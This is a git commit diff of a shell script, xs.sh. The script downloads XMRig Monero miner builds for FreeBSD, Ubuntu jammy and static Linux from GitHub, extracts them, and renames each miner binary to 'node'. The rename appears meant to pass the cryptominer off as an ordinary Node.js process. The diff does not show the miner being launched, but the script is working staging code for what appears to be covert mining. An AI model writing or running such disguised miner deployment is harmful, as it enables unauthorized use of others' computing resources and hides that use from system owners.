7cafa1738e48d71cb4f6b0653c4719ac62d19611
menju2ikg8uti <menju2ikg8uti@kolabnow.com>
2026-02-16 11:51:40 +0700

    Update xs.sh

--- xs.sh
+++ xs.sh
@@ -1,6 +1,17 @@
-mkdir xmr
-mkdir xmr/focal
-wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-freebsd-static-x64.tar.gz
+mkdir xmr/freebsd
+wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-freebsd-static-x64.tar.gz > null
 tar -xvf xmrig-6.25.0-freebsd-static-x64.tar.gz
 mv xmrig-6.25.0/xmrig xmr/freebsd/node
-echo freebsd
+mv xmrig-6.25.0 1
+
+mkdir xmr/jammy
+wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-jammy-x64.tar.gz > nul
+tar -xvf xmrig-6.25.0-jammy-x64.tar.gz
+mv xmrig-6.25.0/xmrig xmr/jammy/node
+mv xmrig-6.25.0 2
+
+mkdir xmr/linux-static
+wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz > null
+tar -xvf xmrig-6.25.0-linux-static-x64.tar.gz
+mv xmrig-6.25.0/xmrig xmr/linux-static/node
+mv xmrig-6.25.0 3
